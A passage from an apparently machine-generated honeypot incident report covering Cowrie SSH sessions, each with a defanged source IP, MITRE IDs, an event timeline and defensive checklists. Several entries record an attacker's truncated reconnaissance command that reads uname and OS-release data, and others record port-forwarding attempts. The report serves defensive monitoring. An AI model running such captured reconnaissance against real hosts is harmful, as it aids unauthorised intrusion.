- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0206692c2dfd

| Field | Detail |
|---|---|
| **Source IP** | `179.179.199[.]138` |
| **First Seen** | 2026-07-17 07:38 |
| **Last Seen** | 2026-07-17 07:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:38:06` | `cowrie.session.connect` |
| `2026-07-17 07:38:06` | `cowrie.client.version` |
| `2026-07-17 07:38:07` | `cowrie.client.kex` |
| `2026-07-17 07:38:07` | `cowrie.login.success` |
| `2026-07-17 07:38:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.179.199[.]138` to AbuseIPDB if not already reported
- [ ] Block `179.179.199[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36b528771184

| Field | Detail |
|---|---|
| **Source IP** | `179.179.199[.]138` |
| **First Seen** | 2026-07-17 07:38 |
| **Last Seen** | 2026-07-17 07:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:38:07` | `cowrie.session.connect` |
| `2026-07-17 07:38:07` | `cowrie.client.version` |
| `2026-07-17 07:38:08` | `cowrie.client.kex` |
| `2026-07-17 07:38:08` | `cowrie.login.success` |
| `2026-07-17 07:38:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.179.199[.]138` to AbuseIPDB if not already reported
- [ ] Block `179.179.199[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0278b855c70

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 07:39 |
| **Last Seen** | 2026-07-17 07:39 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:39:13` | `cowrie.session.connect` |
| `2026-07-17 07:39:14` | `cowrie.client.version` |
| `2026-07-17 07:39:14` | `cowrie.client.kex` |
| `2026-07-17 07:39:24` | `cowrie.login.success` |
| `2026-07-17 07:39:28` | `cowrie.session.params` |
| `2026-07-17 07:39:28` | `cowrie.command.input` |
| `2026-07-17 07:39:28` | `cowrie.command.input` |
| `2026-07-17 07:39:28` | `cowrie.command.input` |
| `2026-07-17 07:39:28` | `cowrie.command.input` |
| `2026-07-17 07:39:28` | `cowrie.command.input` |
| `2026-07-17 07:39:28` | `cowrie.command.success` |
| `2026-07-17 07:39:28` | `cowrie.command.input` |
| `2026-07-17 07:39:28` | `cowrie.command.input` |
| `2026-07-17 07:39:28` | `cowrie.command.input` |
| `2026-07-17 07:39:28` | `cowrie.command.input` |
| `2026-07-17 07:39:30` | `cowrie.log.closed` |
| `2026-07-17 07:39:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85ccc0cc4e81

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-17 07:39 |
| **Last Seen** | 2026-07-17 07:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:39:55` | `cowrie.session.connect` |
| `2026-07-17 07:39:55` | `cowrie.client.version` |
| `2026-07-17 07:39:55` | `cowrie.client.kex` |
| `2026-07-17 07:39:55` | `cowrie.login.success` |
| `2026-07-17 07:39:55` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:39:55` | `cowrie.direct-tcpip.ja4` |
| `2026-07-17 07:39:55` | `cowrie.direct-tcpip.data` |
| `2026-07-17 07:39:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5dcedcd2437

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 07:42 |
| **Last Seen** | 2026-07-17 07:42 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:42:12` | `cowrie.session.connect` |
| `2026-07-17 07:42:16` | `cowrie.client.version` |
| `2026-07-17 07:42:16` | `cowrie.client.kex` |
| `2026-07-17 07:42:24` | `cowrie.login.success` |
| `2026-07-17 07:42:28` | `cowrie.session.params` |
| `2026-07-17 07:42:28` | `cowrie.command.input` |
| `2026-07-17 07:42:28` | `cowrie.command.input` |
| `2026-07-17 07:42:28` | `cowrie.command.input` |
| `2026-07-17 07:42:28` | `cowrie.command.input` |
| `2026-07-17 07:42:28` | `cowrie.command.input` |
| `2026-07-17 07:42:28` | `cowrie.command.success` |
| `2026-07-17 07:42:28` | `cowrie.command.input` |
| `2026-07-17 07:42:28` | `cowrie.command.input` |
| `2026-07-17 07:42:28` | `cowrie.command.input` |
| `2026-07-17 07:42:28` | `cowrie.command.input` |
| `2026-07-17 07:42:31` | `cowrie.log.closed` |
| `2026-07-17 07:42:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1747d0a146f

| Field | Detail |
|---|---|
| **Source IP** | `113.11.34[.]221` |
| **First Seen** | 2026-07-17 07:44 |
| **Last Seen** | 2026-07-17 07:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:44:37` | `cowrie.session.connect` |
| `2026-07-17 07:44:38` | `cowrie.client.version` |
| `2026-07-17 07:44:38` | `cowrie.client.kex` |
| `2026-07-17 07:44:40` | `cowrie.login.success` |
| `2026-07-17 07:44:41` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:44:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.11.34[.]221` to AbuseIPDB if not already reported
- [ ] Block `113.11.34[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36d0ff1cfffa

| Field | Detail |
|---|---|
| **Source IP** | `60.166.8[.]174` |
| **First Seen** | 2026-07-17 07:44 |
| **Last Seen** | 2026-07-17 07:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:44:47` | `cowrie.session.connect` |
| `2026-07-17 07:44:47` | `cowrie.client.version` |
| `2026-07-17 07:44:47` | `cowrie.client.kex` |
| `2026-07-17 07:44:50` | `cowrie.login.success` |
| `2026-07-17 07:44:51` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:44:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.166.8[.]174` to AbuseIPDB if not already reported
- [ ] Block `60.166.8[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9450d336622

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 07:45 |
| **Last Seen** | 2026-07-17 07:45 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:45:01` | `cowrie.session.connect` |
| `2026-07-17 07:45:02` | `cowrie.client.version` |
| `2026-07-17 07:45:02` | `cowrie.client.kex` |
| `2026-07-17 07:45:11` | `cowrie.login.success` |
| `2026-07-17 07:45:16` | `cowrie.session.params` |
| `2026-07-17 07:45:16` | `cowrie.command.input` |
| `2026-07-17 07:45:16` | `cowrie.command.input` |
| `2026-07-17 07:45:16` | `cowrie.command.input` |
| `2026-07-17 07:45:16` | `cowrie.command.input` |
| `2026-07-17 07:45:16` | `cowrie.command.input` |
| `2026-07-17 07:45:16` | `cowrie.command.success` |
| `2026-07-17 07:45:16` | `cowrie.command.input` |
| `2026-07-17 07:45:16` | `cowrie.command.input` |
| `2026-07-17 07:45:16` | `cowrie.command.input` |
| `2026-07-17 07:45:16` | `cowrie.command.input` |
| `2026-07-17 07:45:17` | `cowrie.log.closed` |
| `2026-07-17 07:45:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3888936be2b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-17 07:46 |
| **Last Seen** | 2026-07-17 07:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:46:40` | `cowrie.session.connect` |
| `2026-07-17 07:46:40` | `cowrie.client.version` |
| `2026-07-17 07:46:40` | `cowrie.client.kex` |
| `2026-07-17 07:46:40` | `cowrie.login.success` |
| `2026-07-17 07:46:40` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:46:41` | `cowrie.direct-tcpip.ja4` |
| `2026-07-17 07:46:41` | `cowrie.direct-tcpip.data` |
| `2026-07-17 07:46:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cedc6e734a53

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 07:48 |
| **Last Seen** | 2026-07-17 07:48 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:48:21` | `cowrie.session.connect` |
| `2026-07-17 07:48:22` | `cowrie.client.version` |
| `2026-07-17 07:48:22` | `cowrie.client.kex` |
| `2026-07-17 07:48:26` | `cowrie.login.success` |
| `2026-07-17 07:48:30` | `cowrie.session.params` |
| `2026-07-17 07:48:30` | `cowrie.command.input` |
| `2026-07-17 07:48:30` | `cowrie.command.input` |
| `2026-07-17 07:48:30` | `cowrie.command.input` |
| `2026-07-17 07:48:30` | `cowrie.command.input` |
| `2026-07-17 07:48:30` | `cowrie.command.input` |
| `2026-07-17 07:48:30` | `cowrie.command.success` |
| `2026-07-17 07:48:30` | `cowrie.command.input` |
| `2026-07-17 07:48:30` | `cowrie.command.input` |
| `2026-07-17 07:48:30` | `cowrie.command.input` |
| `2026-07-17 07:48:30` | `cowrie.command.input` |
| `2026-07-17 07:48:32` | `cowrie.log.closed` |
| `2026-07-17 07:48:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-187a12a5c19b

| Field | Detail |
|---|---|
| **Source IP** | `122.170.97[.]94` |
| **First Seen** | 2026-07-17 07:48 |
| **Last Seen** | 2026-07-17 07:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:48:45` | `cowrie.session.connect` |
| `2026-07-17 07:48:45` | `cowrie.client.version` |
| `2026-07-17 07:48:46` | `cowrie.client.kex` |
| `2026-07-17 07:48:48` | `cowrie.login.success` |
| `2026-07-17 07:48:48` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:48:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.97[.]94` to AbuseIPDB if not already reported
- [ ] Block `122.170.97[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b23e5c4b77a1

| Field | Detail |
|---|---|
| **Source IP** | `202.129.35[.]8` |
| **First Seen** | 2026-07-17 07:48 |
| **Last Seen** | 2026-07-17 07:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:48:58` | `cowrie.session.connect` |
| `2026-07-17 07:48:59` | `cowrie.client.version` |
| `2026-07-17 07:48:59` | `cowrie.client.kex` |
| `2026-07-17 07:49:01` | `cowrie.login.success` |
| `2026-07-17 07:49:01` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:49:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.129.35[.]8` to AbuseIPDB if not already reported
- [ ] Block `202.129.35[.]8` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41debe2dfd9f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 07:50 |
| **Last Seen** | 2026-07-17 07:51 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:50:45` | `cowrie.session.connect` |
| `2026-07-17 07:50:47` | `cowrie.client.version` |
| `2026-07-17 07:50:47` | `cowrie.client.kex` |
| `2026-07-17 07:51:04` | `cowrie.login.success` |
| `2026-07-17 07:51:07` | `cowrie.session.params` |
| `2026-07-17 07:51:07` | `cowrie.command.input` |
| `2026-07-17 07:51:07` | `cowrie.command.input` |
| `2026-07-17 07:51:07` | `cowrie.command.input` |
| `2026-07-17 07:51:07` | `cowrie.command.input` |
| `2026-07-17 07:51:07` | `cowrie.command.input` |
| `2026-07-17 07:51:07` | `cowrie.command.success` |
| `2026-07-17 07:51:07` | `cowrie.command.input` |
| `2026-07-17 07:51:07` | `cowrie.command.input` |
| `2026-07-17 07:51:07` | `cowrie.command.input` |
| `2026-07-17 07:51:07` | `cowrie.command.input` |
| `2026-07-17 07:51:09` | `cowrie.log.closed` |
| `2026-07-17 07:51:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de6d6f724a2d

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 07:51 |
| **Last Seen** | 2026-07-17 07:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:51:15` | `cowrie.session.connect` |
| `2026-07-17 07:51:15` | `cowrie.client.version` |
| `2026-07-17 07:51:15` | `cowrie.client.kex` |
| `2026-07-17 07:51:17` | `cowrie.login.success` |
| `2026-07-17 07:51:18` | `cowrie.session.params` |
| `2026-07-17 07:51:18` | `cowrie.command.input` |
| `2026-07-17 07:51:18` | `cowrie.log.closed` |
| `2026-07-17 07:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e2f9c1f8f1b

| Field | Detail |
|---|---|
| **Source IP** | `197.155.225[.]93` |
| **First Seen** | 2026-07-17 07:52 |
| **Last Seen** | 2026-07-17 07:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:52:06` | `cowrie.session.connect` |
| `2026-07-17 07:52:07` | `cowrie.client.version` |
| `2026-07-17 07:52:07` | `cowrie.client.kex` |
| `2026-07-17 07:52:09` | `cowrie.login.success` |
| `2026-07-17 07:52:10` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:52:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.155.225[.]93` to AbuseIPDB if not already reported
- [ ] Block `197.155.225[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51c638571a46

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 07:53 |
| **Last Seen** | 2026-07-17 07:53 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:53:28` | `cowrie.session.connect` |
| `2026-07-17 07:53:29` | `cowrie.client.version` |
| `2026-07-17 07:53:29` | `cowrie.client.kex` |
| `2026-07-17 07:53:33` | `cowrie.login.success` |
| `2026-07-17 07:53:37` | `cowrie.session.params` |
| `2026-07-17 07:53:37` | `cowrie.command.input` |
| `2026-07-17 07:53:37` | `cowrie.command.input` |
| `2026-07-17 07:53:37` | `cowrie.command.input` |
| `2026-07-17 07:53:37` | `cowrie.command.input` |
| `2026-07-17 07:53:37` | `cowrie.command.input` |
| `2026-07-17 07:53:37` | `cowrie.command.success` |
| `2026-07-17 07:53:37` | `cowrie.command.input` |
| `2026-07-17 07:53:37` | `cowrie.command.input` |
| `2026-07-17 07:53:37` | `cowrie.command.input` |
| `2026-07-17 07:53:37` | `cowrie.command.input` |
| `2026-07-17 07:53:39` | `cowrie.log.closed` |
| `2026-07-17 07:53:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28c661e464b0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 07:56 |
| **Last Seen** | 2026-07-17 07:56 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:56:09` | `cowrie.session.connect` |
| `2026-07-17 07:56:09` | `cowrie.client.version` |
| `2026-07-17 07:56:09` | `cowrie.client.kex` |
| `2026-07-17 07:56:18` | `cowrie.login.success` |
| `2026-07-17 07:56:25` | `cowrie.session.params` |
| `2026-07-17 07:56:25` | `cowrie.command.input` |
| `2026-07-17 07:56:25` | `cowrie.command.input` |
| `2026-07-17 07:56:25` | `cowrie.command.input` |
| `2026-07-17 07:56:25` | `cowrie.command.input` |
| `2026-07-17 07:56:25` | `cowrie.command.input` |
| `2026-07-17 07:56:25` | `cowrie.command.success` |
| `2026-07-17 07:56:25` | `cowrie.command.input` |
| `2026-07-17 07:56:25` | `cowrie.command.input` |
| `2026-07-17 07:56:25` | `cowrie.command.input` |
| `2026-07-17 07:56:25` | `cowrie.command.input` |
| `2026-07-17 07:56:28` | `cowrie.log.closed` |
| `2026-07-17 07:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-985b72248482

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 07:58 |
| **Last Seen** | 2026-07-17 07:59 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:58:52` | `cowrie.session.connect` |
| `2026-07-17 07:58:55` | `cowrie.client.version` |
| `2026-07-17 07:58:55` | `cowrie.client.kex` |
| `2026-07-17 07:59:20` | `cowrie.login.success` |
| `2026-07-17 07:59:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc5bcc7bb713

| Field | Detail |
|---|---|
| **Source IP** | `221.199.172[.]66` |
